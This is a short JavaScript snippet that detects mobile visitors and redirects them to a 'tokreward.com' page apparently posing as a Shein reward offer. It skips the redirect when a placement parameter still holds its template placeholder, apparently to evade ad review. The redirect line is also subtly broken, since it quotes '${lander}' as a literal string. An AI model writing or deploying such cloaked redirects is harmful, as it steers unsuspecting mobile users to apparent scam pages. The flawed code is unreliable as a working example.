const utm = new URLSearchParams(window.location.search);
const place = utm.get("place");
const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
const lander = `https://tokreward.com/sheinesp.html?slug=${document.location.hostname.split('.')[0]}`;
if (place === "__PLACEMENT__") { } 
else if (isMobileDevice) { window.location.href = "${lander}"; } 
else { }
